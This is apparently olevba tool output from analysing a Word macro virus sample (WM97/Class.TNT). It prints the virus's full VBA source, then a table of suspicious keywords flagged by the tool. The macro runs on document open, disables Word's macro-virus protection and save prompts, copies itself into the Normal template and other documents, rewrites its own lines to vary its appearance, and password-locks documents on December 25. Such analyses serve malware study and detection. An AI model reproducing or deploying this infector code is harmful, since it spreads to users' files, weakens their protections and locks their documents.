olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TNT-935f08c6f6440d8230e777b41891c4870b560d9f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TNT-935f08c6f6440d8230e777b41891c4870b560d9f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

Dim rsx, rox, xix, xxi As Integer: Dim xxe, xex, exx, exd, cxi, cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: o = 0: r = 0

Randomize

On Error GoTo 93

Options.VirusProtection = Chr(48)

Options.SaveNormalPrompt = Chr(48)

Options.ConfirmConversions = Chr(48)

rt = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines

dt = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines

If dt > 0 And rt > 0 Then GoTo 93

If dt = 0 Then

    Set tnt = NormalTemplate.VBProject.VBComponents

    Set hst = ActiveDocument.VBProject.VBComponents

    If Month(Now()) = 12 And Day(Now()) = 23 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)

    If Month(Now()) = 12 And Day(Now()) = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(84) + Chr(78) + Chr(84)

    If Month(Now()) = 12 And Day(Now()) = 25 Then Application.ActiveDocument.Password = "TNT"

    hst.Item(Abs(1)).Name = tnt.Item(Abs(1)).Name

    hst.Item(Abs(1)).Export Application.StartupPath & System.Version
    
End If

If rt = 0 Then Set tnt = ActiveDocument.VBProject.VBComponents

tnt.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version

With tnt.Item(Abs(1)).codemodule

    For j = Chr(49) To Chr(52)

    .deletelines Chr(49)

    Next j

    End With

If dt = 0 Then tnt.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"

If dt = 0 Then tnt.Item(Abs(1)).codemodule.replaceline 99, "Sub ToolsMarco()"

If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

With tnt.Item(Abs(1)).codemodule

    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55

    cii = Asc(rsx): eox = Chr$(cii + 5): xoe = Chr$(cii - 14): oxe = Chr$(cii + 22): lnr = Chr$(cii - 4)

    cix = Asc(rox): rxe = Chr$(cix + 7): rex = Chr$(cix - 16): exr = Chr$(cix + 4): nrl = Chr$(cix - 17)

    xic = Asc(xix): nix = Chr$(xic + 9): ixn = Chr$(xic - 18): nxi = Chr$(xic + 8): rnl = Chr$(xic - 33)
    
    cxi = Asc(xxi): xxe = Chr$(cxi + 4): xex = Chr$(cxi - 3): exx = Chr$(cxi + 18): exd = Chr$(cxi - 12)

    If Month(Now()) = 12 And Day(Now()) = 26 Then .replaceline 87, ".replaceline j, ""'"" & eox & rxe & nix & xoe & rex & ixn & o * o & r * r * o * o & r * r * o & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"
    
    rd1 = Int(Rnd(1) * 40) + 1
    
    If rd1 = 39 Then .replaceline 87, ".replaceline j, ""'"" & eox & rxe & nix & xoe & rex & ixn & oxe & exr & nix & lnr & nrl & rnl & xxe & xex & exx & exd & oxe & exr & nix & lnr & nrl & rnl & xxe"

End With

  With tnt.Item(Abs(1)).codemodule

For j = Chr(50) To tnt.Item(Abs(1)).codemodule.countoflines Step Chr(50)

    r = Int(Rnd(412835) * 303989) + 8485

    o = Int(Rnd(487958) * 785865) + 2988

    .replaceline j, "'" & r * r & o * o & r * r * o * o & r * r & o * o & r * r & o * o
    
    Next j

 End With

93:

If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

Sub ViewVBCode()

End Sub 'WM97/Class.TNT by Virus :) Smile















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

